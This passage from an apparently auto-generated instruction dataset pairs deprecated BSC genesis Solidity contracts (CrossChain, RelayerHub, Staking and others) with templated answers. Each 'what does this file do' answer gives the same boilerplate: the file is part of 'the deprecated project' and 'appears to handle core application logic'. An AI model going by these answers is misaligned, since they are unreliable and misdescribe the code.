calldata key, bytes calldata value) external override onlyGov whenNotSuspended {\n        revert(\"deprecated\");\n    }\n\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    function challenge(\n        // to avoid stack too deep error, using `uint64[4] calldata params`\n        // instead of  `uint64 height0, uint64 height1, uint64 packageSequence, uint8 channelId`\n        uint64[4] calldata params, // 0-height0, 1-height1, 2-packageSequence, 3-channelId,\n        bytes calldata payload0,\n        bytes calldata payload1,\n        bytes calldata proof0,\n        bytes calldata proof1\n    )\n        external\n        onlyInit\n        blockSynced(params[0])\n        blockSynced(params[1])\n        channelSupported(uint8(params[3]))\n        whenNotSuspended\n    {\n        revert(\"deprecated\");\n    }\n\n    function suspend() external onlyInit onlyCabinet whenNotSuspended {\n        revert(\"deprecated\");\n    }\n\n    function reopen() external onlyInit onlyCabinet whenSuspended {\n        revert(\"deprecated\");\n    }\n\n    function cancelTransfer(address tokenAddr, address attacker) external onlyInit onlyCabinet {\n        revert(\"deprecated\");\n    }\n}\n\n```"}
{"instruction": "What does the file CrossChain.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../interface/0.6.x/ICrossChain.sol\";\nimport \"../interface/0.6.x/ILightClient.sol\";\nimport \"../interface/0.6.x/IBSCValidatorSetV2.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../System.sol\";\n\ncontract CrossChain is System, ICrossChain, IParamSubscriber {\n    uint256 public constant INIT_BATCH_SIZE = 50;\n\n    // governable parameters\n    uint256 public batchSizeForOracle;  // @dev deprecated\n\n    //state variables\n    uint256 public previousTxHeight;\n    uint256 public txCounter;\n    int64 public oracleSequence;\n    mapping(uint8 => address) public channelHandlerContractMap;\n    mapping(address => mapping(uint8 => bool)) public registeredContractChannelMap;\n    mapping(uint8 => uint64) public channelSendSequenceMap;  // @dev deprecated\n    mapping(uint8 => uint64) public channelReceiveSequenceMap;\n    mapping(uint8 => bool) public isRelayRewardFromSystemReward;  // @dev deprecated\n\n    // to prevent the utilization of ancient block header\n    mapping(uint8 => uint64) public channelSyncedHeaderMap;\n\n    bool public isSuspended;\n    // proposal type hash => latest emergency proposal\n    mapping(bytes32 => EmergencyProposal) public emergencyProposals;  // @dev deprecated\n    // proposal type hash => the threshold of proposal approved\n    mapping(bytes32 => uint16) public quorumMap;  // @dev deprecated\n    // IAVL key hash => is challenged\n    mapping(bytes32 => bool) public challenged;  // @dev deprecated\n\n    // struct\n    // BEP-171: Security Enhancement for Cross-Chain Module\n    // @dev deprecated\n    struct EmergencyProposal {\n        uint16 quorum;\n        uint128 expiredAt;\n        bytes32 contentHash;\n        address[] approvers;\n    }\n\n    // event\n    // @dev deprecated\n    event crossChainPackage(\n        uint16 chainId,\n        uint64 indexed oracleSequence,\n        uint64 indexed packageSequence,\n        uint8 indexed channelId,\n        bytes payload\n    );\n    event receive\n```", "output": "This file `CrossChain.sol` is part of the deprecated project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RelayerHub.sol which is part of the deprecated project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\deprecated\\RelayerHub.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../lib/0.6.x/BytesToTypes.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../interface/0.6.x/IRelayerHub.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../System.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\n\ncontract RelayerHub is IRelayerHub, System, IParamSubscriber {\n    using SafeMath for uint256;\n\n    uint256 public constant INIT_REQUIRED_DEPOSIT = 1e20;\n    uint256 public constant INIT_DUES = 1e17;\n\n    uint256 internal requiredDeposit; // have to keep it to not break the storage layout\n    uint256 internal dues;\n\n    mapping(address => relayer) deprecatedRelayers; // old map holding the relayers which are to be allowed safe exit\n    mapping(address => bool) relayersExistMap;\n\n    struct relayer {\n        uint256 deposit;\n        uint256 dues;\n    }\n\n    mapping(address => bool) relayManagersExistMap;\n    mapping(address => address) managerToRelayer;  // @dev deprecated\n    mapping(address => bool) currentRelayers;\n    mapping(address => bool) provisionalRelayers;\n    mapping(address => address) managerToProvisionalRelayer;  // @dev deprecated\n\n    bool public whitelistInitDone;  // @dev deprecated\n\n    modifier onlyManager() {\n        require(relayManagersExistMap[msg.sender], \"manager does not exist\");\n        _;\n    }\n\n    modifier exist() {\n        require(relayersExistMap[msg.sender], \"relayer do not exist\");\n        _;\n    }\n\n    modifier onlyProvisionalRelayer() {\n        require(provisionalRelayers[msg.sender], \"relayer is not a provisional relayer\");\n        _;\n    }\n\n    event relayerUnRegister(address _relayer);\n\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event managerRemoved(address _removedManager);  // @dev deprecated\n    event managerAdded(address _addedManager);  // @dev deprecated\n    event relayerUpdated(address _from, address _to);  // @dev deprecated\n    event relayerAddedProvisionally(address _relayer);  // @dev deprecated\n\n    function init() external onlyNotInit {\n        requiredDeposit = INIT_REQUIRED_DEPOSIT;\n        dues = INIT_DUES;\n        alreadyInit = true;\n    }\n\n    function unregister() external exist onlyInit {\n        relayer memory r = deprecatedRelayers[msg.sender];\n        msg.sender.transfer(r.deposit.sub(r.dues));\n        address payable systemPayable = address(uint160(SYSTEM_REWARD_ADDR));\n        systemPayable.transfer(r.dues);\n        delete relayersExistMap[msg.sender];\n        delete deprecatedRelayers[msg.sender];\n        emit relayerUnRegister(msg.sender);\n    }\n\n    function whitelistInit() external {\n        revert(\"deprecated\");\n    }\n\n    /*----------------- Param update -----------------*/\n    function updateParam(string calldata key, bytes calldata value) external override onlyInit onlyGov {\n        revert(\"deprecated\");\n    }\n\n    function removeManagerByHimself() external {\n        revert(\"deprecated\");\n    }\n\n    // updateRelayer() can be used to add relayer for the first time, update it in future and remove it\n    // in case of removal, we set relayerToBeAdded to be address(0)\n    function updateRelayer(address relayerToBeAdded) external onlyManager {\n        revert(\"deprecated\");\n    }\n\n    // acceptBeingRelayer needs to be called by the relayer after being added provisionally.\n    // This 2 step process of relayer updating is required to avoid having a contract as a relayer.\n    function acceptBeingRelayer(address manager) external onlyProvisionalRelayer {\n        revert(\"deprecated\");\n    }\n\n    function isRelayer(address relayerAddress) external view override returns (bool) {\n        return currentRelayers[relayerAddress];\n    }\n\n    function isProvisionalRelayer(address relayerAddress) external view returns (bool) {\n        return provisionalRelayers[relayerAddress];\n    }\n\n    function isManager(address managerAddress) external view returns (bool) {\n        return relayManagersExistMap[managerAddress];\n    }\n}\n\n```"}
{"instruction": "What does the file RelayerHub.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../lib/0.6.x/BytesToTypes.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../interface/0.6.x/IRelayerHub.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../System.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\n\ncontract RelayerHub is IRelayerHub, System, IParamSubscriber {\n    using SafeMath for uint256;\n\n    uint256 public constant INIT_REQUIRED_DEPOSIT = 1e20;\n    uint256 public constant INIT_DUES = 1e17;\n\n    uint256 internal requiredDeposit; // have to keep it to not break the storage layout\n    uint256 internal dues;\n\n    mapping(address => relayer) deprecatedRelayers; // old map holding the relayers which are to be allowed safe exit\n    mapping(address => bool) relayersExistMap;\n\n    struct relayer {\n        uint256 deposit;\n        uint256 dues;\n    }\n\n    mapping(address => bool) relayManagersExistMap;\n    mapping(address => address) managerToRelayer;  // @dev deprecated\n    mapping(address => bool) currentRelayers;\n    mapping(address => bool) provisionalRelayers;\n    mapping(address => address) managerToProvisionalRelayer;  // @dev deprecated\n\n    bool public whitelistInitDone;  // @dev deprecated\n\n    modifier onlyManager() {\n        require(relayManagersExistMap[msg.sender], \"manager does not exist\");\n        _;\n    }\n\n    modifier exist() {\n        require(relayersExistMap[msg.sender], \"relayer do not exist\");\n        _;\n    }\n\n    modifier onlyProvisionalRelayer() {\n        require(provisionalRelayers[msg.sender], \"relayer is not a provisional relayer\");\n        _;\n    }\n\n    event relayerUnRegister(address _relayer);\n\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event managerRemoved(address _removedManager);  // @dev deprecated\n    event managerAdded(address _addedManager);  // @dev deprecated\n    event relayerUpdated(address _from, address _to);  // @dev deprecated\n    event relayerAddedProvisionally(address _relayer);  // @dev deprecated\n\n    function init() external onlyNotInit {\n```", "output": "This file `RelayerHub.sol` is part of the deprecated project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RelayerIncentivize.sol which is part of the deprecated project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\deprecated\\RelayerIncentivize.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../interface/0.6.x/IRelayerIncentivize.sol\";\nimport \"../System.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../lib/0.6.x/BytesToTypes.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../interface/0.6.x/ISystemReward.sol\";\n\ncontract RelayerIncentivize is IRelayerIncentivize, System, IParamSubscriber {\n    using SafeMath for uint256;\n\n    uint256 public constant HEADER_RELAYER_REWARD_RATE_MOLECULE = 1;\n    uint256 public constant HEADER_RELAYER_REWARD_RATE_DENOMINATOR = 5;\n    uint256 public constant CALLER_COMPENSATION_MOLECULE = 1;\n    uint256 public constant CALLER_COMPENSATION_DENOMINATOR = 80;\n\n    uint256 public headerRelayerRewardRateMolecule;\n    uint256 public headerRelayerRewardRateDenominator;\n    uint256 public callerCompensationMolecule;\n    uint256 public callerCompensationDenominator;\n\n    mapping(address => uint256) public headerRelayersSubmitCount;  // @dev deprecated\n    address payable[] public headerRelayerAddressRecord;  // @dev deprecated\n\n    mapping(address => uint256) public packageRelayersSubmitCount;  // @dev deprecated\n    address payable[] public packageRelayerAddressRecord;  // @dev deprecated\n\n    uint256 public collectedRewardForHeaderRelayer = 0;  // @dev deprecated\n    uint256 public collectedRewardForTransferRelayer = 0;  // @dev deprecated\n\n    uint256 public roundSequence = 0;  // @dev deprecated\n    uint256 public countInRound = 0;  // @dev deprecated\n\n    mapping(address => uint256) public relayerRewardVault;\n\n    uint256 public dynamicExtraIncentiveAmount;  // @dev deprecated\n\n    event rewardToRelayer(address relayer, uint256 amount);\n\n    event distributeCollectedReward(\n        uint256 sequence, uint256 roundRewardForHeaderRelayer, uint256 roundRewardForTransferRelayer\n    );  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n\n    function init() external onlyNotInit {\n        require(!alreadyInit, \"already initialized\");\n        headerRelayerRewardRateMolecule = HEADER_RELAYER_REWARD_RATE_MOLECULE;\n        headerRelayerRewardRateDenominator = HEADER_RELAYER_REWARD_RATE_DENOMINATOR;\n        callerCompensationMolecule = CALLER_COMPENSATION_MOLECULE;\n        callerCompensationDenominator = CALLER_COMPENSATION_DENOMINATOR;\n        alreadyInit = true;\n    }\n\n    receive() external payable { }\n\n    function addReward(\n        address payable headerRelayerAddr,\n        address payable packageRelayer,\n        uint256 amount,\n        bool fromSystemReward\n    ) external override onlyInit onlyCrossChainContract returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function updateParam(string calldata key, bytes calldata value) external override onlyGov {\n        revert(\"deprecated\");\n    }\n}\n\n```"}
{"instruction": "What does the file RelayerIncentivize.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../interface/0.6.x/IRelayerIncentivize.sol\";\nimport \"../System.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../lib/0.6.x/BytesToTypes.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../interface/0.6.x/ISystemReward.sol\";\n\ncontract RelayerIncentivize is IRelayerIncentivize, System, IParamSubscriber {\n    using SafeMath for uint256;\n\n    uint256 public constant HEADER_RELAYER_REWARD_RATE_MOLECULE = 1;\n    uint256 public constant HEADER_RELAYER_REWARD_RATE_DENOMINATOR = 5;\n    uint256 public constant CALLER_COMPENSATION_MOLECULE = 1;\n    uint256 public constant CALLER_COMPENSATION_DENOMINATOR = 80;\n\n    uint256 public headerRelayerRewardRateMolecule;\n    uint256 public headerRelayerRewardRateDenominator;\n    uint256 public callerCompensationMolecule;\n    uint256 public callerCompensationDenominator;\n\n    mapping(address => uint256) public headerRelayersSubmitCount;  // @dev deprecated\n    address payable[] public headerRelayerAddressRecord;  // @dev deprecated\n\n    mapping(address => uint256) public packageRelayersSubmitCount;  // @dev deprecated\n    address payable[] public packageRelayerAddressRecord;  // @dev deprecated\n\n    uint256 public collectedRewardForHeaderRelayer = 0;  // @dev deprecated\n    uint256 public collectedRewardForTransferRelayer = 0;  // @dev deprecated\n\n    uint256 public roundSequence = 0;  // @dev deprecated\n    uint256 public countInRound = 0;  // @dev deprecated\n\n    mapping(address => uint256) public relayerRewardVault;\n\n    uint256 public dynamicExtraIncentiveAmount;  // @dev deprecated\n\n    event rewardToRelayer(address relayer, uint256 amount);\n\n    event distributeCollectedReward(\n        uint256 sequence, uint256 roundRewardForHeaderRelayer, uint256 roundRewardForTransferRelayer\n    );  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n\n    function init() external onlyNotInit {\n        require(!alreadyInit, \"alrea\n```", "output": "This file `RelayerIncentivize.sol` is part of the deprecated project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Staking.sol which is part of the deprecated project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\deprecated\\Staking.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../System.sol\";\nimport \"../interface/0.6.x/IApplication.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../interface/0.6.x/IStaking.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\n\ncontract Staking is IStaking, System, IParamSubscriber, IApplication {\n    using SafeMath for uint256;\n\n    uint256 public constant TEN_DECIMALS = 1e10;\n\n    uint256 public constant INIT_RELAYER_FEE = 16 * 1e15;\n    uint256 public constant INIT_BSC_RELAYER_FEE = 1 * 1e16;\n    uint256 public constant INIT_MIN_DELEGATION = 100 * 1e18;\n    uint256 public constant INIT_TRANSFER_GAS = 2300;\n\n    uint256 public relayerFee;\n    uint256 public bSCRelayerFee;\n    uint256 public minDelegation;\n\n    mapping(address => uint256) delegated; // delegator => totalAmount\n    mapping(address => mapping(address => uint256)) delegatedOfValidator; // delegator => validator => amount\n    mapping(address => uint256) distributedReward; // delegator => reward\n    mapping(address => mapping(address => uint256)) pendingUndelegateTime; // delegator => validator => minTime\n    mapping(address => uint256) undelegated; // delegator => totalUndelegated\n    mapping(address => mapping(address => mapping(address => uint256))) pendingRedelegateTime; // delegator => srcValidator => dstValidator => minTime\n\n    mapping(uint256 => bytes32) packageQueue; // index => package's hash  // @dev deprecated\n    mapping(address => uint256) delegateInFly; // delegator => delegate request in fly\n    mapping(address => uint256) undelegateInFly; // delegator => undelegate request in fly\n    mapping(address => uint256) redelegateInFly; // delegator => redelegate request in fly\n\n    uint256 internal leftIndex;  // @dev deprecated\n    uint256 internal rightIndex;  // @dev deprecated\n    uint8 internal locked;\n\n    uint256 public transferGas; // this param is newly added after the hardfork on testnet. It need to be initialed by governed\n\n    modifier noReentrant() {\n        require(locked != 2, \"No re-entrancy\");\n        locked = 2;\n        _;\n        locked = 1;\n    }\n\n    modifier tenDecimalPrecision(uint256 amount) {\n        require(msg.value % TEN_DECIMALS == 0 && amount % TEN_DECIMALS == 0, \"precision loss in conversion\");\n        _;\n    }\n\n    modifier initParams() {\n        if (!alreadyInit) {\n            relayerFee = INIT_RELAYER_FEE;\n            bSCRelayerFee = INIT_BSC_RELAYER_FEE;\n            minDelegation = INIT_MIN_DELEGATION;\n            transferGas = INIT_TRANSFER_GAS;\n            alreadyInit = true;\n        }\n        _;\n    }\n\n    /*----------------- Events -----------------*/\n    event rewardClaimed(address indexed delegator, uint256 amount);\n\n    event delegateSubmitted(address indexed delegator, address indexed validator, uint256 amount, uint256 relayerFee);  // @dev deprecated\n    event undelegateSubmitted(address indexed delegator, address indexed validator, uint256 amount, uint256 relayerFee);  // @dev deprecated\n    event redelegateSubmitted(\n        address indexed delegator,\n        address indexed validatorSrc,\n        address indexed validatorDst,\n        uint256 amount,\n        uint256 relayerFee\n    );  // @dev deprecated\n    event rewardReceived(address indexed delegator, uint256 amount);  // @dev deprecated\n    event undelegatedReceived(address indexed delegator, address indexed validator, uint256 amount);  // @dev deprecated\n    event undelegatedClaimed(address indexed delegator, uint256 amount);\n    event delegateSuccess(address indexed delegator, address indexed validator, uint256 amount);  // @dev deprecated\n    event undelegateSuccess(address indexed delegator, address indexed validator, uint256 amount);  // @dev deprecated\n    event redelegateSuccess(address indexed delegator, address indexed valSrc, address indexed valDst, uint256 amount);  // @dev deprecated\n    event delegateFailed(address indexed delegator, address indexed validator, uint256 amount, uint8 errCode);  // @dev deprecated\n    event undelegateFailed(address indexed delegator, address indexed validator, uint256 amount, uint8 errCode);  // @dev deprecated\n    event redelegateFailed(\n        address indexed delegator, address indexed valSrc, address indexed valDst, uint256 amount, uint8 errCode\n    );  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n    event failedSynPackage(uint8 indexed eventType, uint256 errCode);  // @dev deprecated\n    event crashResponse(uint8 indexed eventType);  // @dev deprecated\n\n    receive() external payable { }\n\n    /*----------------- Implement cross chain app -----------------*/\n    function handleSynPackage(\n        uint8,\n        bytes calldata msgBytes\n    ) external override onlyCrossChainContract initParams returns (bytes memory) {\n        revert(\"deprecated\");\n    }\n\n    function handleAckPackage(uint8, bytes calldata msgBytes) external override onlyCrossChainContract initParams {\n        revert(\"deprecated\");\n    }\n\n    function handleFailAckPackage(uint8, bytes calldata msgBytes) external override onlyCrossChainContract initParams {\n        revert(\"deprecated\");\n    }\n\n    /*----------------- External functions -----------------*/\n    /**\n     * @dev Deprecated after fusion\n     */\n    function delegate(address, uint256) external payable override {\n        revert(\"not supported\");\n    }\n\n    /**\n     * @dev Undelegate BNB from BC to BSC\n     *\n     * @param validator BC validator encoded address the user delegated\n     * @param amount BNB amount the user undelegates\n     */\n    function undelegate(\n        address validator,\n        uint256 amount\n    ) external payable override noReentrant tenDecimalPrecision(amount) initParams {\n        revert(\"deprecated\");\n    }\n\n    /**\n     * @dev Deprecated after fusion\n     */\n    function redelegate(address, address, uint256) external payable override {\n        revert(\"not supported\");\n    }\n\n    /**\n     * @dev claim delegated reward from BC staking\n     *\n     */\n    function claimReward() external override noReentrant returns (uint256 amount) {\n        amount = distributedReward[msg.sender];\n        require(amount > 0, \"no pending reward\");\n\n        distributedReward[msg.sender] = 0;\n        (bool success,) = msg.sender.call{ gas: transferGas, value: amount }(\"\");\n        require(success, \"transfer failed\");\n        emit rewardClaimed(msg.sender, amount);\n    }\n\n    /**\n     * @dev claim undelegated BNB from BC staking\n     *\n     */\n    function claimUndelegated() external override noReentrant returns (uint256 amount) {\n        amount = undelegated[msg.sender];\n        require(amount > 0, \"no undelegated funds\");\n\n        undelegated[msg.sender] = 0;\n        (bool success,) = msg.sender.call{ gas: transferGas, value: amount }(\"\");\n        require(success, \"transfer failed\");\n        emit undelegatedClaimed(msg.sender, amount);\n    }\n\n    function getDelegated(address delegator, address validator) external view override returns (uint256) {\n        return delegatedOfValidator[delegator][validator];\n    }\n\n    function getTotalDelegated(address delegator) external view override returns (uint256) {\n        return delegated[delegator];\n    }\n\n    function getDistributedReward(address delegator) external view override returns (uint256) {\n        return distributedReward[delegator];\n    }\n\n    function getPendingRedelegateTime(\n        address delegator,\n        address valSrc,\n        address valDst\n    ) external view override returns (uint256) {\n        return pendingRedelegateTime[delegator][valSrc][valDst];\n    }\n\n    function getUndelegated(address delegator) external view override returns (uint256) {\n        return undelegated[delegator];\n    }\n\n    function getPendingUndelegateTime(address delegator, address validator) external view override returns (uint256) {\n        return pendingUndelegateTime[delegator][validator];\n    }\n\n    function getRelayerFee() external view override returns (uint256) {\n        return relayerFee;\n    }\n\n    function getMinDelegation() external view override returns (uint256) {\n        return minDelegation;\n    }\n\n    function getRequestInFly(address delegator) external view override returns (uint256[3] memory) {\n        uint256[3] memory request;\n        request[0] = delegateInFly[delegator];\n        request[1] = undelegateInFly[delegator];\n        request[2] = redelegateInFly[delegator];\n        return request;\n    }\n\n    /*----------------- Internal functions -----------------*/\n\n    /*----------------- Param update -----------------*/\n    function updateParam(string calldata key, bytes calldata value) external override onlyInit onlyGov {\n        revert(\"deprecated\");\n    }\n}\n\n```"}
{"instruction": "What does the file Staking.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../System.sol\";\nimport \"../interface/0.6.x/IApplication.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../interface/0.6.x/IStaking.sol\";\nimport \"../lib/0.6.x/SafeMath.sol\";\n\ncontract Staking is IStaking, System, IParamSubscriber, IApplication {\n    using SafeMath for uint256;\n\n    uint256 public constant TEN_DECIMALS = 1e10;\n\n    uint256 public constant INIT_RELAYER_FEE = 16 * 1e15;\n    uint256 public constant INIT_BSC_RELAYER_FEE = 1 * 1e16;\n    uint256 public constant INIT_MIN_DELEGATION = 100 * 1e18;\n    uint256 public constant INIT_TRANSFER_GAS = 2300;\n\n    uint256 public relayerFee;\n    uint256 public bSCRelayerFee;\n    uint256 public minDelegation;\n\n    mapping(address => uint256) delegated; // delegator => totalAmount\n    mapping(address => mapping(address => uint256)) delegatedOfValidator; // delegator => validator => amount\n    mapping(address => uint256) distributedReward; // delegator => reward\n    mapping(address => mapping(address => uint256)) pendingUndelegateTime; // delegator => validator => minTime\n    mapping(address => uint256) undelegated; // delegator => totalUndelegated\n    mapping(address => mapping(address => mapping(address => uint256))) pendingRedelegateTime; // delegator => srcValidator => dstValidator => minTime\n\n    mapping(uint256 => bytes32) packageQueue; // index => package's hash  // @dev deprecated\n    mapping(address => uint256) delegateInFly; // delegator => delegate request in fly\n    mapping(address => uint256) undelegateInFly; // delegator => undelegate request in fly\n    mapping(address => uint256) redelegateInFly; // delegator => redelegate request in fly\n\n    uint256 internal leftIndex;  // @dev deprecated\n    uint256 internal rightIndex;  // @dev deprecated\n    uint8 internal locked;\n\n    uint256 public transferGas; // this param is newly added after the hardfork on testnet. It need to be initialed by governed\n\n    modifier noReentrant() {\n        require(locked != 2, \"No re-\n```", "output": "This file `Staking.sol` is part of the deprecated project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for TendermintLightClient.sol which is part of the deprecated project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\deprecated\\TendermintLightClient.sol`:\n\n```sol\npragma solidity 0.6.4;\n\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../interface/0.6.x/ILightClient.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../System.sol\";\n\ncontract TendermintLightClient is ILightClient, System, IParamSubscriber {\n    struct ConsensusState {\n        uint64 preValidatorSetChangeHeight;\n        bytes32 appHash;\n        bytes32 curValidatorSetHash;\n        bytes nextValidatorSet;\n    }\n\n    mapping(uint64 => ConsensusState) public lightClientConsensusStates;\n    mapping(uint64 => address payable) public submitters;\n    uint64 public initialHeight;\n    uint64 public latestHeight;  // @dev deprecated\n    bytes32 public chainID;  // @dev deprecated\n\n    bytes public constant INIT_CONSENSUS_STATE_BYTES =\n        hex\"42696e616e63652d436861696e2d5469677269730000000000000000000000000000000006915167cedaf7bbf7df47d932fdda630527ee648562cf3e52c5e5f46156a3a971a4ceb443c53a50d8653ef8cf1e5716da68120fb51b636dc6d111ec3277b098ecd42d49d3769d8a1f78b4c17a965f7a30d4181fabbd1f969f46d3c8e83b5ad4845421d8000000e8d4a510002ba4e81542f437b7ae1f8a35ddb233c789a8dc22734377d9b6d63af1ca403b61000000e8d4a51000df8da8c5abfdb38595391308bb71e5a1e0aabdc1d0cf38315d50d6be939b2606000000e8d4a51000b6619edca4143484800281d698b70c935e9152ad57b31d85c05f2f79f64b39f3000000e8d4a510009446d14ad86c8d2d74780b0847110001a1c2e252eedfea4753ebbbfce3a22f52000000e8d4a510000353c639f80cc8015944436dab1032245d44f912edc31ef668ff9f4a45cd0599000000e8d4a51000e81d3797e0544c3a718e1f05f0fb782212e248e784c1a851be87e77ae0db230e000000e8d4a510005e3fcda30bd19d45c4b73688da35e7da1fce7c6859b2c1f20ed5202d24144e3e000000e8d4a51000b06a59a2d75bf5d014fce7c999b5e71e7a960870f725847d4ba3235baeaa08ef000000e8d4a510000c910e2fe650e4e01406b3310b489fb60a84bc3ff5c5bee3a56d5898b6a8af32000000e8d4a5100071f2d7b8ec1c8b99a653429b0118cd201f794f409d0fea4d65b1b662f2b00063000000e8d4a51000\";\n    uint256 public constant INIT_REWARD_FOR_VALIDATOR_SER_CHANGE = 1e16;\n    uint256 public rewardForValidatorSetChange;\n\n    event initConsensusState(uint64 initHeight, bytes32 appHash);  // @dev deprecated\n    event syncConsensusState(uint64 height, uint64 preValidatorSetChangeHeight, bytes32 appHash, bool validatorChanged);  // @dev deprecated\n    event paramChange(string key, bytes value);  // @dev deprecated\n\n    function init() external onlyNotInit {\n        uint256 pointer;\n        uint256 length;\n        (pointer, length) = Memory.fromBytes(INIT_CONSENSUS_STATE_BYTES);\n\n        /* solium-disable-next-line */\n        assembly {\n            sstore(chainID_slot, mload(pointer))\n        }\n\n        alreadyInit = true;\n        rewardForValidatorSetChange = INIT_REWARD_FOR_VALIDATOR_SER_CHANGE;\n    }\n\n    function syncTendermintHeader(bytes calldata header, uint64 height) external onlyRelayer returns (bool) {\n        revert(\"deprecated\");\n    }\n\n    function isHeaderSynced(uint64 height) external view override returns (bool) {\n        return submitters[height] != address(0x0) || height == initialHeight;\n    }\n\n    function getAppHash(uint64 height) external view override returns (bytes32) {\n        return lightClientConsensusStates[height].appHash;\n    }\n\n    function getSubmitter(uint64 height) external view override returns (address payable) {\n        return submitters[height];\n    }\n\n    function getChainID() external view returns (string memory) {\n        bytes memory chainIDBytes = new bytes(32);\n        assembly {\n            mstore(add(chainIDBytes, 32), sload(chainID_slot))\n        }\n\n        uint8 chainIDLength = 0;\n        for (uint8 j = 0; j < 32; ++j) {\n            if (chainIDBytes[j] != 0) {\n                ++chainIDLength;\n            } else {\n                break;\n            }\n        }\n\n        bytes memory chainIDStr = new bytes(chainIDLength);\n        for (uint8 j = 0; j < chainIDLength; ++j) {\n            chainIDStr[j] = chainIDBytes[j];\n        }\n\n        return string(chainIDStr);\n    }\n\n    function updateParam(string calldata key, bytes calldata value) external override onlyInit onlyGov {\n        revert(\"deprecated\");\n    }\n}\n\n```"}
{"instruction": "What does the file TendermintLightClient.sol do?", "input": "```sol\npragma solidity 0.6.4;\n\nimport \"../lib/0.6.x/Memory.sol\";\nimport \"../interface/0.6.x/ILightClient.sol\";\nimport \"../interface/0.6.x/IParamSubscriber.sol\";\nimport \"../System.sol\";\n\ncontract TendermintLightClient is ILightClient, System, IParamSubscriber {\n    struct ConsensusState {\n        uint64 preValidatorSetChangeHeight;\n        bytes32 appHash;\n        bytes32 curValidatorSetHash;\n        bytes nextValidatorSet;\n    }\n\n    mapping(uint64 => ConsensusState) public lightClientConsensusStates;\n    mapping(uint64 => address payable) public submitters;\n    uint64 public initialHeight;\n    uint64 public latestHeight;  // @dev deprecated\n    bytes32 public chainID;  // @dev deprecated\n\n    bytes public constant INIT_CONSENSUS_STATE_BYTES =\n        hex\"42696e616e63652d436861696e2d5469677269730000000000000000000000000000000006915167cedaf7bbf7df47d932fdda630527ee648562cf3e52c5e5f46156a3a971a4ceb443c53a50d8653ef8cf1e5716da68120fb51b636dc6d111ec3277b098ecd42d49d3769d8a1f78b4c17a965f7a30d4181fabbd1f969f46d3c8e83b5ad4845421d8000000e8d4a510002ba4e81542f437b7ae1f8a35ddb233c789a8dc22734377d9b6d63af1ca403b61000000e8d4a51000df8da8c5abfdb38595391308bb71e5a1e0aabdc1d0cf38315d50d6be939b2606000000e8d4a51000b6619edca4143484800281d698b70c935e9152ad57b31d85c05f2f79f64b39f3000000e8d4a510009446d14ad86c8d2d74780b0847110001a1c2e252eedfea4753ebbbfce3a22f52000000e8d4a510000353c639f80cc8015944436dab1032245d44f912edc31ef668ff9f4a45cd0599000000e8d4a51000e81d3797e0544c3a718e1f05f0fb782212e248e784c1a851be87e77ae0db230e000000e8d4a510005e3fcda30bd19d45c4b73688da35e7da1fce7c6859b2c1f20ed5202d24144e3e000000e8d4a51000b06a59a2d75bf5d014fce7c999b5e71e7a960870f725847d4ba3235baeaa08ef000000e8d4a510000c910e2fe650e4e01406b3310b489fb60a84bc3ff5c5bee3a56d5898b6a8af32000000e8d4a5100071f2d7b8ec1c8b99a653429b0118cd201f794f409d0fea4d65b1b662f2b00063000000e8d4a51000\";\n    uint256 public constant INIT_REWARD_FOR_VALIDATOR_SER_CHANGE = 1e16;\n    uint256 public rewardForValidatorSetChange;\n\n    event initConsensusState\n```", "output": "This file `TendermintLightClient.sol` is part of the deprecated project. Based on the code structure, it appears to handle core application logic."}
